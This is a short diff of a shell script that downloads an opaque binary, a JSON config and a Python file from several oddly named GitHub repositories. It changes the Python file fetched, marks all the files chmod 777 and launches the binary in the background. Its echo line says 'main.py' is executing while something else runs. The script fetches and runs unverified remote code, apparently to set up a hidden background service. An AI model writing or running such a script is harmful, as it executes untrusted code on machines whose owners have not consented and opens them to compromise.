@@ -39,7 +39,7 @@ echo "Executing main.py..."
 cd /mnt
 wget https://raw.githubusercontent.com/hosseinxdns4/potential-bassoon/main/x
 wget https://raw.githubusercontent.com/hosseinxdns4/cautious-umbrella/main/s.json
-wget https://raw.githubusercontent.com/hosseinxdns4/fictional-bassoon/main/main.py
+wget https://raw.githubusercontent.com/hosseinxdns4/ideal-winner/main/ht.py
 echo "./x run --config=s.json" > bash.sh
 chmod 777 *
 ./bash.sh &
